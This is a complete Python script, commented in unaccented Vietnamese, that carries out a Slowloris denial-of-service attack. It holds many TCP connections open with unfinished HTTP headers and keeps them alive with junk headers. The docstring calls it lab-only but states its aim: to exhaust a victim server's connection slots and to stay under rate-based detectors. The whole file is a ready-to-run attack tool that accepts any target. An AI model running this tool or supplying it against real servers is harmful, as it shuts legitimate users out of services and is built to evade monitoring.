#!/usr/bin/env python3
"""Slowloris (L7 low-and-slow) - chi dung trong lab co lap.

Mo that nhieu ket noi TCP, gui header HTTP DANG DO (khong ket thuc), roi thinh
thoang gui them 1 header rac de GIU ket noi song. Muc tieu: lam CAN slot ket noi
(worker_connections) cua victim -> client hop le khong connect duoc. Luu luong rat
THAP nen qua mat cac detector dua tren nguong pps/syn (minh hoa diem mu low-and-slow).
"""
import argparse
import random
import socket
import time


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("-p", "--port", type=int, default=80)
    ap.add_argument("-c", "--conns", type=int, default=150, help="so ket noi can giu")
    ap.add_argument("-d", "--duration", type=int, default=0, help="giay, 0 = vo han")
    ap.add_argument("--interval", type=int, default=10, help="chu ky gui header giu song (giay)")
    args = ap.parse_args()

    def open_conn():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((args.target, args.port))
            # header dang do: co request line + Host nhung CHUA ket thuc (thieu dong trong)
            s.send(("GET /?%d HTTP/1.1\r\n" % random.randint(0, 99999)).encode())
            s.send(("Host: %s\r\n" % args.target).encode())
            s.send(b"User-Agent: slowloris-lab\r\n")
            return s
        except OSError:
            return None

    socks = []
    for _ in range(args.conns):
        s = open_conn()
        if s:
            socks.append(s)
    print("[*] Slowloris: giu %d/%d ket noi -> %s:%d" % (len(socks), args.conns, args.target, args.port))

    end = time.time() + args.duration if args.duration else None
    try:
        while end is None or time.time() < end:
            time.sleep(args.interval)
            for s in list(socks):
                try:
                    s.send(("X-a: %d\r\n" % random.randint(0, 99999)).encode())  # giu song
                except OSError:
                    socks.remove(s)
                    ns = open_conn()  # ket noi bi rot -> mo lai
                    if ns:
                        socks.append(ns)
            print("[*] dang giu %d ket noi" % len(socks))
    except KeyboardInterrupt:
        pass
    for s in socks:
        try:
            s.close()
        except OSError:
            pass
    print("[*] done")


if __name__ == "__main__":
    main()
